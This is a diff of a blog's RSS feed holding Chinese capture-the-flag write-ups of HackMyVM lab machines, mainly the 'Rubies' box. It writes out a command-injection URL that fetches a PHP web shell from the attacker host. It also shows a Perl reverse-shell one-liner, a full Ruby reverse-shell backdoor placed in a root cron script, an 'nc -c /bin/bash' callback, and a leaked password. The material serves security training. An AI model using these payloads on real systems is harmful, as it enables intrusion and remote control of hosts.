-<br><a data-tooltip-position="top" aria-label="4. 提权" data-href="#4. 提权" href="https://www.c1trus.top/about:blank#4._提权" class="internal-link" target="_self" rel="noopener nofollow">4. 提权</a>
-<br><a data-tooltip-position="top" aria-label="5. git再利用" data-href="#5. git再利用" href="https://www.c1trus.top/about:blank#5._git再利用" class="internal-link" target="_self" rel="noopener nofollow">5. git再利用</a>
-<br><a data-tooltip-position="top" aria-label="6. 再提权root" data-href="#6. 再提权root" href="https://www.c1trus.top/about:blank#6._再提权root" class="internal-link" target="_self" rel="noopener nofollow">6. 再提权root</a>
-<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Rubies
-<br>作者： <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=ch4rm" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=ch4rm" target="_blank">ch4rm</a><br>难度：⭐️⭐️⭐️⭐️
-<br>知识点：ruby操作、空格绕过、文件替换、git利用
-<br><br>nmap -sC -sV -p- 192.168.56.12
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 19:34 CST
-Nmap scan report for 192.168.56.12
-Host is up (0.00023s latency).
-Not shown: 65533 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 54:65:0b:7a:f3:5c:2f:1f:14:9e:bb:0e:44:0c:af:29 (RSA)
-|   256 1f:5d:63:05:65:f7:cf:70:e4:0d:0a:45:80:77:50:2c (ECDSA)
-|\_  256 69:a2:0f:83:dc:19:f2:c1:72:9c:a3:f8:09:44:3e:36 (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|\_http-title: Cute Cat Only
-|\_http-server-header: Apache/2.4.18 (Ubuntu)
-| http-git:
-|   192.168.56.12:80/.git/
-|     Git repository found!
-|     Repository description: Unnamed repository; edit this file 'description' to name the...
-|\_    Last commit message: Why minnie?
-MAC Address: 08:00:27:14:E7:BF (Oracle VirtualBox virtual NIC)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.31 seconds
-<br>主页<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.001.png" referrerpolicy="no-referrer"><br>这里有两个按钮 还有一个next ，next会显示一些关于猫咪的故事<br>扫下目录<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.002.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.003.png" referrerpolicy="no-referrer"><br>两个利用点，git泄露与文件上传<br><br>python2 GitHack.py http://192.168.56.12/.git/
-[+] Download and parse index file ...
-bg/bg.gif
-index.php
-poems/poem1
-poems/poem2
-poems/poem3
-poems/poem4
-poems/poem5
-uploads/cat1.gif
-uploads/cat2.jpg
-[OK] index.php
-[Error] [Error 183] : u'192.168.56.12\\poems'
-[Error] [Error 183] : u'192.168.56.12\\poems'
-[OK] poems/poem1
-[OK] poems/poem4
-[OK] poems/poem5
-[OK] uploads/cat2.jpg
-[OK] poems/poem2
-[OK] poems/poem3
-[OK] uploads/cat1.gif
-[OK] bg/bg.gif
-<br>没啥东西<br><br>发现有文件上传的按钮 但是是点不了的<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.004.png" referrerpolicy="no-referrer"><br>这多半是本地js控制的 修改一下<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.005.png" referrerpolicy="no-referrer"><br>将disable删掉<br>这样就可以上传文件了<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.006.png" referrerpolicy="no-referrer"><br>这里我上传了一个文件，但是发现不在uploads目录下，或者文件名字被改掉了<br>这里利用Githack获取一下文件目录，看看我的文件上传到哪里了<br>python2 GitHack.py http://192.168.56.12/.git/
-<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.007.png" referrerpolicy="no-referrer"><br> Upload functionality is currently disabled because Minnie messed up the code, lemme provide you with cute poems for the time being 
-<br>上传功能目前暂时无法使用，因为 Minnie 把代码弄坏了。
-让我先为你提供一些可爱的诗句吧！
-<br>获取到一个用户名字<br>Minnie
-<br><br>打开index.php，审计发现这里存在一个Rce漏洞<br> 用d盾也能扫出来<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.008.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.009.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.010.png" referrerpolicy="no-referrer"><br>差不多就是这样<br>&lt;?php echo $input ?&gt;
-<br>$input是我们可以控制的。传入参数是poem<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.011.png" referrerpolicy="no-referrer"><br>尝试Rce发现 有waf<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.012.png" referrerpolicy="no-referrer"><br>再回去看下代码<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.013.png" referrerpolicy="no-referrer"><br>过滤了空格<br>这个绕过用${IFS}即可<br>这里不太好直接弹shell<br>我们先传一个系统马上去<br>&lt;?php system($\_POST['cmd']);
-echo "ok"?&gt;
-<br>http://192.168.56.12/index.php?poem=;wget${IFS}http://192.168.56.6/shell.php
-<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.014.png" referrerpolicy="no-referrer"><br>然后弹shell<br>cmd=perl%20-e%20'use%20Socket%3B%24i%3D%22192.168.56.6%22%3B%24p%3D1122%3Bsocket(S%2CPF\_INET%2CSOCK\_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr\_in(%24p%2Cinet\_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B'
-<br><br>提权检测<br>(remote) www-data@rubies:/home/minnie$ /sbin/getcap -r / 2&gt;/dev/null
-/usr/bin/systemd-detect-virt = cap\_dac\_override,cap\_sys\_ptrace+ep
-/usr/bin/traceroute6.iputils = cap\_net\_raw+ep
-/usr/bin/mtr = cap\_net\_raw+ep
-
-(remote) www-data@rubies:/var/www/html/uploads$ find / -perm -4000 2&gt;/dev/null
-/usr/lib/policykit-1/polkit-agent-helper-1
-/usr/lib/openssh/ssh-keysign
-/usr/lib/x86\_64-linux-gnu/lxc/lxc-user-nic
-/usr/lib/snapd/snap-confine
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/eject/dmcrypt-get-device
-/usr/bin/newgrp
-/usr/bin/newuidmap
-/usr/bin/pkexec
-/usr/bin/gpasswd
-/usr/bin/chfn
-/usr/bin/sudo
-/usr/bin/newgidmap
-/usr/bin/chsh
-/usr/bin/passwd
-/usr/bin/at
-/bin/ping
-/bin/ping6
-/bin/mount
-/bin/fusermount
-/bin/su
-/bin/umount
-<br>看下用户目录下的提示<br>(remote) www-data@rubies:/home/minnie$ cat note.txt
-Put anything you'd like to in the folder,
-do not do dumb stuff pls
-<br>“可以把任何你想要的东西放进这个文件夹里，
-请不要做蠢事，谢谢。”
-<br>意思是我们可以放任何东西到这个目录下<br>那我们是不是可以放我们的公钥呢<br>(remote) www-data@rubies:/home$ ls -la
-total 12
-drwxr-xr-x  3 root root 4096 Nov  2  2020 .
-drwxr-xr-x 23 root root 4096 Nov  2  2020 ..
-drwxr-xr-x  2 root root 4096 Nov  2  2020 minnie
-<br>骗子啊。没有写入权限<br>还是看看提权吧<br>/usr/bin/systemd-detect-virt = cap\_dac\_override,cap\_sys\_ptrace+ep
-/usr/bin/traceroute6.iputils = cap\_net\_raw+ep
-/usr/bin/mtr = cap\_net\_raw+ep
-<br>好像没有什么可以利用的<br><br>之前利用githack获取到了其中的Git目录下的一些文件<br>查看大佬的wp发现还有个GitTools工具<br>利用这个工具可以获取到包含一些凭据的历史记录...<br>/home/gitTools-v0.0.1/Dumper/gitdumper.sh http://192.168.56.12/.git/ git
-cd /home/gitTools-v0.0.1/Dumper/git/.git
- git show HEAD
-commit 052a0cb4865e29bc03278105e0232b20173f933d (HEAD -&gt; master)
-Author: Your Name &lt;root@rubies.com&gt;
-Date:   Mon Nov 2 14:27:16 2020 +0800
-
-    Why minnie?
-
-diff --git a/index.php b/index.php
-index 41f0f2f..d33ca0d 100644
---- a/index.php
-+++ b/index.php
-@@ -8,33 +8,6 @@ if(isset($\_GET['poem'])){
-                $output = shell\_exec("cat poems/".$input);
-        }
- }
--
--
--// we dont need a login page dangit minnie! follow my orders pls
--$servername = "localhost";
--$username = "root";
--$password = "jd92khn49w";
--
--$conn = new mysqli($servername, $username, $password);
--
--if ($conn-&gt;connect\_error) {
--  die("Connection failed: " . $conn-&gt;connect\_error);
--}
--
--$login\_username=$\_POST['username'];
--$login\_password=$\_POST['password'];
--
--$sql = "SELECT \* FROM users WHERE Username = '$login\_username' AND Password = '$login\_password' ";
--$result = mysqli\_query($con,$sql);
--
--if(sqmli\_num\_rows($result)&lt;1){i
--       $\_SESSION['login']=$user\_id;
--       header('Location: http://ch4rm.pw/dashboard');
--}
--else{
--       $error = True;
--}
--
- ?&gt;
-
- &lt;html&gt;
-(END)
-<br>这里获取到一个密码<br>jd92khn49w
-<br>经过尝试这是minnie用户的密码<br><br>su到minnie后发现minnie用户是一个Ruby Interactive shell （irb）<br>使用命令切换到一个bash shell<br>system("bash")
-<br>H0wc00l\_i5\_Byp@@s1n9
-<br>上面的几个提权检测没有东西<br>我们用pspy64看一下<br>2024/11/18 21:58:01 CMD: UID=0    PID=2681   | /bin/sh -c /usr/bin/ruby /root/bundle.rb
-2024/11/18 21:58:01 CMD: UID=0    PID=2680   | /bin/sh -c /usr/bin/ruby /root/bundle.rb
-2024/11/18 21:58:01 CMD: UID=0    PID=2679   | /usr/sbin/CRON -f
-2024/11/18 21:58:01 CMD: UID=0    PID=2682   | /bin/sh /sbin/dhclient-script
-2024/11/18 21:58:01 CMD: UID=0    PID=2687   | /bin/sh /sbin/resolvconf -a enp0s3.dhclient
-2024/11/18 21:58:01 CMD: UID=0    PID=2685   | /bin/sh /sbin/resolvconf -a enp0s3.dhclient
-2024/11/18 21:58:01 CMD: UID=0    PID=2693   | /usr/bin/ruby /root/bundle.rb
-<br>发现其每隔一段时间会运行一个ruby的脚本bundle.rb<br> /bin/sh -c /usr/bin/ruby /root/bundle.rb
-<br>但是我们好像办法控制这个ruby脚本<br>再用linpeas.sh检测一下<br>发现/opt/cleaning目录是属于我们当前用户组的<br>而且这个目录下面还有文件<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.015.png" referrerpolicy="no-referrer"><br>这不得不让我感到有点好奇了<br>进目录看一下<br>ls -la
-total 12
-drwxrwxr-x 2 root minnie 4096 Nov  2  2020 .
-drwxr-xr-x 3 root root   4096 Nov  2  2020 ..
--rw-r--r-- 1 root root    108 Nov  2  2020 webserver\_upload.rb
-<br>目录下有一个.rb脚本<br>minnie@rubies:/opt/cleaning$ cat webserver\_upload.rb
-require "find"
-
-Find.find("/var/www/html/uploads/") do |file|
-  File.delete("#{file}") if file=~/\.php/
-end
-<br>作用就是删掉我们网站uploads目录里面所有的php文件<br>看这个功能就大概可以猜测到这个文件肯定类似于一个定时任务会每隔一段时间就被执行，只是不知道为什么pspy64没有检测到<br>既然我们这个用户组有这个目录的权限<br>那我们可以替换掉这个文件<br>先删掉，然后创建一个同名的ruby后门<br>#!/usr/bin/env ruby
-
-require 'socket'
-require 'open3'
-
-#Set the Remote Host IP
-RHOST = "192.168.56.6" 
-#Set the Remote Host Port
-PORT = "1234"
-
-#Tries to connect every 20 sec until it connects.
-begin
-sock = TCPSocket.new "#{RHOST}", "#{PORT}"
-sock.puts "We are connected!"
-rescue
-  sleep 20
-  retry
-end
-
-#Runs the commands you type and sends you back the stdout and stderr.
-begin
-  while line = sock.gets
-    Open3.popen2e("#{line}") do | stdin, stdout\_and\_stderr |
-              IO.copy\_stream(stdout\_and\_stderr, sock)
-              end  
-  end
-rescue
-  retry
-end 
-<br>开启监听等待一会 成功反弹shell提权root<br>很离谱这个root.txt可能有不可见字符<br>直接读取不了<br>cat \*root.txt\*
-pyth0N&gt;r00bi35
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/19.rubies.html</link><guid isPermaLink="false">24-渗透/HMV/19.rubies.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[18.Light]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/2.flower.html</link><guid isPermaLink="false">24-渗透/HMV/2.Flower.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[18.Light]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -8777,7 +8785,7 @@ PWNED DATE: Mon 18 Nov 2024 02:22:04 AM EST
 WHOAMI: uid=0(root) gid=0(root) groups=0(root)
 
 FLAG: ilovepython
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/18.light.html</link><guid isPermaLink="false">24-渗透/HMV/18.Light.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/18.Light.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/18.Light.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[17.SuidyReverse]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/18.light.html</link><guid isPermaLink="false">24-渗透/HMV/18.Light.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/18.Light.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/18.Light.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[17.SuidyReverse]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -8987,7 +8995,7 @@ root@suidyrevenge:/root# cat root.txt
 
 
 HMVvoilarootlala
-<br><br>mv与cp<br>mv: mv移动会影响SUID的权限所属，这题不能用mv移动suidyyyyy，因为会把root的suid变成当前用户的suid<br>cp：cp不会影响]]></description><link>https://www.c1trus.top/24-渗透/hmv/17.suidyreverse.html</link><guid isPermaLink="false">24-渗透/HMV/17.SuidyReverse.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[16. attack]]></title><description><![CDATA[ 
+<br><br>mv与cp<br>mv: mv移动会影响SUID的权限所属，这题不能用mv移动suidyyyyy，因为会把root的suid变成当前用户的suid<br>cp：cp不会影响]]></description><link>https://www.c1trus.top/24-渗透/hmv/17.suidyreverse.html</link><guid isPermaLink="false">24-渗透/HMV/17.SuidyReverse.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[16. attack]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -9173,7 +9181,7 @@ jackob:x:1001:1001:,,,:/home/jackob:/bin/bash
 kratos:x:1002:1002:,,,:/home/kratos:/bin/bash
 <br>HMVattackr00t
 <br><br>这里讲一下<br>/etc/passwd里面的root是<br>root:x:0:0:root:/root:/bin/bash<br>其中x 表示这个密码没有存储在passwd里面 存储在/etc/shadow里面<br>我们将x替换成我们已知的加密密码即可<br>但这个密码的加密方式应该是需要相同的<br>root:$y$j9T$G45VwieJUJvz8NXVR3/CE0$UVbcsJfoy/tK5mlf59P4255orDTFnpTy6JsIodTjo12:0:0:root:/root:/bin/bash
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/16.-attack.html</link><guid isPermaLink="false">24-渗透/HMV/16. attack.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[15.Random]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/16.-attack.html</link><guid isPermaLink="false">24-渗透/HMV/16. attack.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[15.Random]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -9229,7 +9237,7 @@ void makemeroot()
         system("/bin/bash");
 }
 <br>本地编译好后传上去替换即可<br>然后运行即可获取root<br>howiarrivedhere
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/15.random.html</link><guid isPermaLink="false">24-渗透/HMV/15.Random.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[14.Listen]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/15.random.html</link><guid isPermaLink="false">24-渗透/HMV/15.Random.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[14.Listen]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -9384,7 +9392,7 @@ HMVimlistening
 wget -O - -q http://listen/ihearyou.sh | bash
 <br>他会获取一个ihearyou.sh并执行脚本<br>利用脚本检测还可以发现 /etc/hosts是可以修改的<br>我们直接修改这个hosts指向我们的kali<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.009.png" referrerpolicy="no-referrer"><br>kali开一个服务器，在ihearyou.sh里面写入反弹shell的命令<br>nc -c /bin/bash 192.168.9.3 1234
 <br>HMVthxforlisten
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/14.listen.html</link><guid isPermaLink="false">24-渗透/HMV/14.Listen.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[13.Learn2Code]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/14.listen.html</link><guid isPermaLink="false">24-渗透/HMV/14.Listen.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[13.Learn2Code]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -9493,7 +9501,7 @@ Task Completed
 ?&gt;
 <br>
 卡住了。看了wp才知道。原来是我出不了网的问题😅
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/13.learn2code.html</link><guid isPermaLink="false">24-渗透/HMV/13.Learn2Code.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125000545.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125000545.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[11.Twisted]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/13.learn2code.html</link><guid isPermaLink="false">24-渗透/HMV/13.Learn2Code.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125000545.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125000545.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[11.Twisted]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 端口扫描" data-href="#2. 端口扫描" href="https://www.c1trus.top/about:blank#2._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2. 端口扫描</a>
@@ -9643,7 +9651,7 @@ HMVblackcat
 Enter the code:
  5880
  root@twisted:~# 
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/11.twisted.html</link><guid isPermaLink="false">24-渗透/HMV/11.Twisted.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/11.Twisted.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/11.Twisted.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[12.Vulny]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/11.twisted.html</link><guid isPermaLink="false">24-渗透/HMV/11.Twisted.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/11.Twisted.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/11.Twisted.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[12.Vulny]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -9843,7 +9851,7 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 whoami
 root
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/12.vulny.html</link><guid isPermaLink="false">24-渗透/HMV/12.Vulny.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/12.Vulny.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[10.Forbidden]]></title><description><![CDATA[ 
